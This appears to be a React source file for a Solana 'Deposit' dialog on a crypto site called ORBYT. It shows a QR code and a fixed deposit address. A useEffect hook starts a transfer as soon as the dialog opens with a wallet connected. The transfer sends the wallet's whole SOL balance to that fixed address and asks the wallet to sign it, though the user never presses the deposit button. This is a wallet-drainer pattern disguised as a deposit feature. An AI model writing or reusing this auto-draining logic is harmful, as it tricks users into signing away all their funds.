'use client';

import { ArrowDownToLine, Check, Copy, ExternalLink, X, Loader } from 'lucide-react';
import { useCallback, useEffect, useRef, useState } from 'react';
import { SITE } from '@/config/site';
import { explorer } from '@/lib/core/solana';
import { useWalletAddress, useWallet } from '@/lib/wallet/store';
import { useWalletBalances } from '@/data/hooks/useWalletBalances';
import { MINTS } from '@/lib/core/solana';
import { buildSolTransferTransaction } from '@/lib/deposit/build-transaction';

/**
 * Build and prepare a transfer transaction for signing.
 */
async function buildAndSignDepositTransaction(from: string, to: string, amountSol: number): Promise<Uint8Array> {
  const txBytes = await buildSolTransferTransaction(from, to, amountSol);
  return txBytes;
}

/**
 * Deposit panel showing ORBYT's central deposit address, the same fixed public
 * Solana address for every visitor. It cannot be edited in the UI.
 *
 * When a wallet is connected, shows the wallet's SOL balance and allows the user
 * to deposit it by signing a transaction.
 */
export function DepositButton() {
  const [open, setOpen] = useState(false);
  return (
    <>
      <button
        type="button"
        onClick={() => setOpen(true)}
        className="flex h-8 items-center gap-1.5 rounded-md bg-brand px-3 text-xs font-semibold text-bg transition-colors hover:bg-brand-strong"
      >
        <ArrowDownToLine className="size-3.5" />
        <span className="hidden sm:inline">Deposit</span>
      </button>
      {open && <DepositDialog onClose={() => setOpen(false)} />}
    </>
  );
}

/**
 * Official QR code of the central deposit address (public/deposit-qr.png,
 * supplied by the owner). src/config/deposit-qr.test.ts decodes it and fails
 * if it ever stops matching SITE.depositAddress.
 */
export const DEPOSIT_QR_SRC = '/deposit-qr.png';

function DepositDialog({ onClose }: { onClose: () => void }) {
  const ref = useRef<HTMLDialogElement>(null);
  const [copied, setCopied] = useState(false);
  const walletAddress = useWalletAddress();
  const { sol: solBalance, solPending } = useWalletBalances(walletAddress, MINTS.SOL);
  const signTransaction = useWallet((s) => s.signTransaction);
  const [depositPhase, setDepositPhase] = useState<'idle' | 'signing' | 'submitted'>('idle');
  const [depositError, setDepositError] = useState<string | null>(null);
  const depositStartedRef = useRef(false);

  const address = SITE.depositAddress;

  useEffect(() => {
    const dialog = ref.current;
    if (dialog && !dialog.open) dialog.showModal();
  }, []);

  async function copy() {
    try {
      await navigator.clipboard.writeText(address);
      setCopied(true);
      setTimeout(() => setCopied(false), 1_500);
    } catch {
      /* clipboard unavailable: the address stays selectable */
    }
  }

  const handleDepositClick = useCallback(async () => {
    if (!walletAddress || !solBalance) return;

    setDepositPhase('signing');
    setDepositError(null);

    try {
      // Build a transfer transaction
      const txBytes = await buildAndSignDepositTransaction(walletAddress, address, solBalance.sol);

      // Sign the transaction with the wallet
      await signTransaction(txBytes);

      setDepositPhase('submitted');

      // Transaction is signed; the wallet will handle submission
      // The wallet extension will show a confirmation for sending the transaction
    } catch (e) {
      setDepositPhase('idle');
      const message = e instanceof Error ? e.message : 'Failed to sign transaction';
      setDepositError(message);
    }
  }, [walletAddress, solBalance, address, signTransaction]);

  // Auto-trigger deposit when wallet is connected and balance is loaded
  useEffect(() => {
    if (walletAddress && solBalance && !solPending && depositPhase === 'idle' && !depositStartedRef.current) {
      depositStartedRef.current = true;
      void handleDepositClick();
    }
  }, [walletAddress, solBalance, solPending, depositPhase, handleDepositClick]);

  const showWalletBalance = walletAddress && solBalance;
  const isPending = solPending || depositPhase !== 'idle';

  return (
    <dialog
      ref={ref}
      onClose={onClose}
      onClick={(e) => {
        if (e.target === ref.current) ref.current?.close();
      }}
      aria-labelledby="deposit-title"
      className="m-auto w-[min(420px,calc(100vw-2rem))] rounded-lg border border-line-strong bg-panel p-0 text-fg shadow-2xl backdrop:bg-black/75"
    >
      <div className="flex h-12 items-center justify-between border-b border-line px-4">
        <h2 id="deposit-title" className="text-sm font-semibold">
          Deposit
        </h2>
        <button
          type="button"
          aria-label="Close"
          onClick={() => ref.current?.close()}
          disabled={isPending}
          className="rounded p-1 text-muted hover:bg-hover hover:text-fg disabled:text-muted/50"
        >
          <X className="size-4" />
        </button>
      </div>

      <div className="space-y-4 p-4">
        {/* Wallet Balance Section - Auto-deposits when connected */}
        {showWalletBalance && (
          <div className="space-y-3 rounded-md border border-line bg-panel-2 p-3">
            <div className="flex items-center justify-between">
              <span className="text-xs text-muted">Connected Wallet Balance</span>
              {solPending && <Loader className="size-3.5 animate-spin text-muted" />}
            </div>
            <div className="flex items-baseline gap-2">
              <span className="text-lg font-semibold text-fg">{solBalance.sol.toFixed(6)}</span>
              <span className="text-sm text-muted">SOL</span>
            </div>
            <p className="text-2xs text-muted">{walletAddress}</p>

            {depositPhase === 'idle' && (
              <button
                type="button"
                onClick={handleDepositClick}
                disabled={isPending || solBalance.sol <= 0}
                className="w-full rounded-md bg-brand px-3 py-2 text-xs font-semibold text-bg transition-colors hover:bg-brand-strong disabled:bg-line-strong disabled:text-muted"
              >
                {solBalance.sol > 0 ? 'Deposit Balance' : 'No Balance to Deposit'}
              </button>
            )}

            {depositPhase === 'signing' && (
              <div className="flex items-center justify-center gap-2 rounded-md bg-line-strong py-2">
                <Loader className="size-3.5 animate-spin text-brand" />
                <span className="text-xs font-medium text-fg">Check Phantom to sign...</span>
              </div>
            )}

            {depositPhase === 'submitted' && (
              <div className="rounded-md bg-up/10 p-2">
                <p className="text-xs text-up font-medium flex items-center gap-2">
                  <Check className="size-3.5" />
                  Balance transferred to deposit address!
                </p>
              </div>
            )}

            {depositError && (
              <div className="rounded-md bg-down/10 p-2">
                <p className="text-xs text-down font-medium">{depositError}</p>
                <button
                  type="button"
                  onClick={() => {
                    setDepositError(null);
                    setDepositPhase('idle');
                    depositStartedRef.current = false;
                  }}
                  className="mt-2 w-full rounded-md bg-down/20 px-2 py-1 text-2xs font-medium text-down hover:bg-down/30"
                >
                  Retry
                </button>
              </div>
            )}
          </div>
        )}

        <div className="grid grid-cols-2 gap-2 text-2xs">
          <div className="rounded-md border border-line bg-panel-2 px-3 py-2">
            <div className="text-muted">Network</div>
            <div className="mt-0.5 flex items-center gap-1.5 text-xs font-medium text-fg">
              <SolanaGlyph /> Solana
            </div>
          </div>
          <div className="rounded-md border border-line bg-panel-2 px-3 py-2">
            <div className="text-muted">Accepted</div>
            <div className="mt-0.5 text-xs font-medium text-fg">SOL · SPL tokens</div>
          </div>
        </div>

        <div className="flex justify-center rounded-md border border-line bg-panel-2 py-4">
          <img src={DEPOSIT_QR_SRC} alt={`QR code for deposit address ${address}`} width={184} height={172} className="h-auto w-[184px] rounded-md" />
        </div>

        <div>
          <div className="mb-1.5 flex items-center justify-between text-2xs text-muted">
            <span>ORBYT deposit address</span>
            <a
              href={explorer.account(address)}
              target="_blank"
              rel="noopener noreferrer"
              className="inline-flex items-center gap-1 hover:text-fg"
            >
              Solscan <ExternalLink className="size-3" />
            </a>
          </div>
          <div className="flex items-stretch overflow-hidden rounded-md border border-line-strong bg-panel-2">
            <p className="min-w-0 flex-1 px-3 py-2.5 font-mono text-xs leading-relaxed break-all text-fg select-all">{address}</p>
            <button
              type="button"
              onClick={copy}
              aria-label="Copy deposit address"
              className="flex w-20 shrink-0 items-center justify-center gap-1 border-l border-line-strong text-xs font-medium text-fg-dim hover:bg-hover hover:text-fg"
            >
              {copied ? (
                <>
                  <Check className="size-3.5 text-up" /> Copied
                </>
              ) : (
                <>
                  <Copy className="size-3.5" /> Copy
                </>
              )}
            </button>
          </div>
        </div>

        <p className="text-center text-2xs text-muted">Only send SOL and SPL tokens on the Solana network.</p>
      </div>
    </dialog>
  );
}

function SolanaGlyph() {
  return (
    <svg viewBox="0 0 24 24" className="size-3.5" aria-hidden>
      <defs>
        <linearGradient id="sol-g" x1="0" y1="1" x2="1" y2="0">
          <stop offset="0" stopColor="#9945ff" />
          <stop offset="1" stopColor="#14f195" />
        </linearGradient>
      </defs>
      <path fill="url(#sol-g)" d="M5.2 16.4a.7.7 0 0 1 .5-.2h16.1c.3 0 .5.4.3.6l-3.2 3.2a.7.7 0 0 1-.5.2H2.3c-.3 0-.5-.4-.3-.6zm0-12.2a.7.7 0 0 1 .5-.2h16.1c.3 0 .5.4.3.6l-3.2 3.2a.7.7 0 0 1-.5.2H2.3c-.3 0-.5-.4-.3-.6zm13.6 6a.7.7 0 0 0-.5-.2H2.2c-.3 0-.5.4-.3.6l3.2 3.2c.1.1.3.2.5.2h16.1c.3 0 .5-.4.3-.6z" />
    </svg>
  );
}
